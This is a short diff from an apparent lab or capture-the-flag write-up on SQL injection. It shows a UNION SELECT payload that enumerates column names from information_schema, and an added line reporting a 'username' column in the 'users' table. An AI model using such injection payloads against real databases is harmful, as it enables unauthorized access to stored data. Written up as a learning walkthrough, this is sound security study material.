@@ -100,3 +100,4 @@ After many tryed i've found full table name, which is `users`<br/>
 
     admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME !='%username%'; ---
 ![column name](images/23-column-name-found.png)<br/>
+I've found a column called `username` under the `users` table and database `sql_three`<br/>
